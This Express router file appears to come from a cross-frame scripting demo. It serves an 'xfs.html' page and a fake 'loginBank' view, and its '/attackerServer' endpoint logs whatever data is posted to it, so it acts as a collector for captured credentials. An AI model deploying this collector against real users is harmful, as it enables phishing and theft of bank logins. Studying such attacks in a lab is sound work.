var express = require('express');
var router = express.Router();
var path = require('path');

/* GET home page. */
router.get('/', function(req, res, next) {
    res.sendFile(path.join(__dirname + '/../views/xfs.html'));
});

router.get('/', function (req, res, next) {
    console.log(req.body)
});

// login
router.get('/loginBank', function (req, res) {
    res.render('loginBank', {user: req.user});
});

router.post('/attackerServer', function (req, res) {
    if (req.method === 'POST') {
        req.on('data', function (data) {
            console.log(data.toString());

        });
    }
});

module.exports = router;